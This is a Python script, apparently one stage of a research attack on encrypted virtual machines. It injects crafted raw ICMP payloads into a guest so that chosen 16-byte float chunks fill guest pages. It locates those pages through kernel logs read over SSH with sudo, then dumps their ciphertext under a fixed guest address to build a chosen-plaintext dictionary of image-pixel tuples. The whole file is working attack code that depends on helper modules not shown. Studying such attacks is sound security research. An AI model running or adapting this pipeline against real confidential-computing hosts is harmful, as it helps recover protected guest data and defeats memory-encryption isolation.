#!/usr/bin/env python3
"""
stage1_ref_dict.py — Stage 1: 3DShapes tuple dictionary at FIXED_GPA.

For every keyword in offline/dict_keywords.json (top-K 4-pixel tuples per
channel, 3K refs), inject an ICMP payload that repeats the keyword's exact 16 B
float32 chunk, locate a guest page that the payload fills end to end, and read
that page's ciphertext under FIXED_GPA (swapio.swap_read). The page then holds
the keyword at all 256 block offsets, so one dump covers every alignment.

Differences from MURA's stage 1:
  * a chunk is 4 possibly different floats, so the page must start on a 16 B
    chunk boundary (MURA's identical floats only needed a 4 B phase);
  * refs are per channel (R/G/B normalize differently).

  sudo python3 stage1_ref_dict.py [--rebuild] [--only R03,G00] [--output-dir .]
"""
import argparse
import hashlib
import os
import re
import socket
import struct
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c
import swapio

PAYLOAD_SIZE = 8193
ICMP_HOLD_SEC = 7.0
_last_icmp = 0.0
_FRAG_RE = re.compile(r"frag\[(\d+)\]:\s*compound_GPA=0x([0-9a-fA-F]+)\s+off=(\d+)\s+size=(\d+)")


def _checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i + 1] << 8) + data[i]
    if len(data) & 1:
        s += data[-1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def send_icmp(payload: bytes):
    global _last_icmp
    if _last_icmp:
        wait = ICMP_HOLD_SEC - (time.monotonic() - _last_icmp)
        if wait > 0:
            time.sleep(wait)
    pid = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, pid, 0)
    hdr = struct.pack("!BBHHH", 8, 0, _checksum(hdr + payload), pid, 0)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        s.sendto(hdr + payload, ("192.168.100.2", 0))
    finally:
        s.close()
    _last_icmp = time.monotonic()


def parse_frags(out: str) -> List[Tuple[int, int, int]]:
    frags: List[Tuple[int, int, int]] = []
    for m in _FRAG_RE.finditer(out):
        idx = int(m.group(1))
        if idx == 0:
            frags = []
        frags.append((int(m.group(2), 16), int(m.group(3)), int(m.group(4))))
    return frags


def pick_target_page(frags) -> Optional[Tuple[int, int]]:
    """(page_gpa, payload_offset) of the largest page wholly inside one fragment."""
    best, cum = None, 0
    for gpa, off, size in frags:
        start, end = gpa + off, gpa + off + size
        page = (start + c.PAGE_SIZE - 1) & ~(c.PAGE_SIZE - 1)
        if page + c.PAGE_SIZE <= end:
            cand = (size, page, cum + (page - start))
            if best is None or cand[0] > best[0]:
                best = cand
        cum += size
    return (best[1], best[2]) if best else None


def _read_icmp() -> str:
    out = c.ssh_run("cat /proc/large_icmp_last 2>/dev/null")
    if out and "frag[" in out:
        return out
    d = c.ssh_run("sudo dmesg")
    return d if (d and "frag[" in d) else (out or "")


def _clear_icmp():
    c.ssh_run("echo clear | sudo tee /proc/large_icmp_last >/dev/null 2>&1; sudo dmesg -C 2>/dev/null; true")


def acquire_gpa(chunk: Optional[bytes], retries: int = 10) -> int:
    """Inject `chunk` repeated (or zeros if None); return a page it fills, phase 0 mod 16."""
    probe = b"\x00" * PAYLOAD_SIZE
    layout = None
    for _ in range(retries):
        if layout is None:
            _clear_icmp()
            send_icmp(probe)
            time.sleep(1.0)
            layout = parse_frags(_read_icmp())
            if not layout:
                time.sleep(5)
                continue
        tgt = pick_target_page(layout)
        if tgt is None:
            layout = None
            time.sleep(2)
            continue
        prefix = tgt[1] % c.CHUNK_SIZE
        payload = probe if chunk is None else \
            b"\x00" * prefix + (chunk * (PAYLOAD_SIZE // c.CHUNK_SIZE + 2))[:PAYLOAD_SIZE - prefix]
        _clear_icmp()
        send_icmp(payload)
        time.sleep(1.0)
        landed = parse_frags(_read_icmp())
        if not landed:
            time.sleep(2)
            continue
        tgt = pick_target_page(landed)
        if tgt is None:
            layout = landed
            continue
        gpa, off = tgt
        if chunk is None or (off >= prefix and (off - prefix) % c.CHUNK_SIZE == 0):
            return gpa
        print(f"[stage1]     landed at payload offset {off} (phase {(off - prefix) % 16}/16) — retry",
              file=sys.stderr)
        layout = landed
    raise RuntimeError("acquire_gpa failed after retries")


def scratch_gpa() -> Optional[int]:
    """Start (if needed) the guest scratch holder and return its first pinned page."""
    if "0x" not in c.ssh_run("cat /tmp/scratch_gpas 2>/dev/null"):
        c.ssh_run(f"cd {c.GUEST_DIR} && sudo nohup {c.GUEST_PY} guest_scratch_holder.py "
                  f">/dev/null 2>&1 &", timeout=10)
        time.sleep(3)
    out = c.ssh_run("cat /tmp/scratch_gpas 2>/dev/null")
    g = [int(x, 16) for x in out.split() if x.startswith("0x")]
    return g[0] if g else None


def page_sig(path: Path) -> bytes:
    return hashlib.sha256(c.parse_dump(path)).digest()


def run_stage1(output_dir: Path, rebuild: bool = False, only: Optional[List[str]] = None) -> Dict:
    output_dir.mkdir(parents=True, exist_ok=True)
    c.ensure_guest_suppressions()
    c.ensure_mtu_9000()
    c.DICT_DIR.mkdir(parents=True, exist_ok=True)
    refs = c.load_keywords()

    cache = {"fixed_gpa": None, "refs": {}}
    if c.DICT_CACHE_FILE.exists() and not rebuild:
        cache = c.load_json(c.DICT_CACHE_FILE)
    if not cache.get("fixed_gpa") or rebuild:
        fx = scratch_gpa()
        if fx:
            print(f"[stage1] FIXED_GPA from the guest scratch holder")
        else:
            print("[stage1] [!] no scratch holder — falling back to an ICMP page (MURA way)")
            fx = acquire_gpa(None)
        cache["fixed_gpa"] = hex(fx)
        cache["refs"] = {}
        c.save_json(c.DICT_CACHE_FILE, cache)
    fixed = int(cache["fixed_gpa"], 16)
    print(f"[stage1] FIXED_GPA = 0x{fixed:x}")

    todo = [r for r in refs if (only and r["name"] in only) or
            (not only and (rebuild or not (c.DICT_DIR / f"ref_{r['name']}.out").exists()))]
    seen: Dict[bytes, str] = {}
    for r in refs:
        f = c.DICT_DIR / f"ref_{r['name']}.out"
        if r not in todo and f.exists():
            seen[page_sig(f)] = r["name"]

    t0 = time.time()
    for i, r in enumerate(todo):
        out = c.DICT_DIR / f"ref_{r['name']}.out"
        ok = False
        for attempt in range(4):
            gpa = acquire_gpa(r["chunk"])
            swapio.swap_read(fixed, gpa, out)
            sig = page_sig(out)
            if sig not in seen:
                ok = True
                break
            print(f"[stage1]     {r['name']} duplicates {seen[sig]} (attempt {attempt + 1}) — retry")
            time.sleep(2)
        if ok:
            seen[sig] = r["name"]
        cache["refs"][r["name"]] = {"ref_gpa": hex(gpa), "ch": r["ch"], "pixels": r["pixels"],
                                    "file": str(out), "verified": ok}
        c.save_json(c.DICT_CACHE_FILE, cache)
        print(f"  [{i + 1}/{len(todo)}] {r['name']} {r['pixels']} GPA=0x{gpa:x}"
              f"{'' if ok else '  [UNUSABLE]'}  ({time.time() - t0:.0f}s)")

    bad = [n for n, v in cache["refs"].items() if not v.get("verified")]
    meta = {"stage": 1, "fixed_gpa": hex(fixed), "num_refs": len(refs),
            "usable_refs": len(refs) - len(bad), "unusable_refs": bad,
            "dict_dir": str(c.DICT_DIR), "build_sec": round(time.time() - t0, 1),
            "timestamp": time.time()}
    c.save_json(output_dir / "ref_dict.json", meta)
    print(f"[stage1] {meta['usable_refs']}/{len(refs)} usable refs, {meta['build_sec']}s")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--rebuild", action="store_true")
    p.add_argument("--only", default=None, help="Comma-separated ref names, e.g. R03,G00")
    p.add_argument("--output-dir", default=str(HERE))
    a = p.parse_args()
    run_stage1(Path(a.output_dir), rebuild=a.rebuild, only=a.only.split(",") if a.only else None)


if __name__ == "__main__":
    main()
